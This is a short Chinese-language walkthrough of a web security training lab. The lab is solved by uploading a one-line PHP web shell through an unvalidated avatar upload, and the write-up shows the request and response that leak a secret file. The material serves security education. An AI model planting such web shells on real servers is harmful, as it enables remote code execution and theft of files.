# 实验：通过上传 Web Shell 实现远程代码执行

本实验包含一个易受攻击的图片上传功能。它在将用户上传的文件存储到服务器文件系统之前，未对文件进行任何验证。

为了解决本实验，请上传一个基本的 PHP Web Shell，并利用它窃取 `/home/carlos/secret` 文件的内容。使用实验室横幅中提供的按钮提交此秘密信息。

你可以使用以下凭据登录自己的账户：`wiener:peter`

## 步骤

探测
- 在账户页面发现头像上传功能
- 将 php 代码放入 php 文件 `x.php` 中

    ```php
    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ```
- 提交载荷文件
- 访问账户页面，自动请求头像
    ```http
    GET /files/avatars/x.php HTTP/2
    ```
    - 服务器响应
        ```http
        HTTP/2 200 OK
        Date: Wed, 05 Aug 2026 10:58:32 GMT
        Server: Apache/2.4.41 (Ubuntu)
        Content-Type: text/html; charset=UTF-8
        X-Frame-Options: SAMEORIGIN
        Content-Length: 32

        DbuHFHn4OxGyGI5cYWUAB5x9a6kCvyns
        ```
        - 成功执行读取文件内容的代码
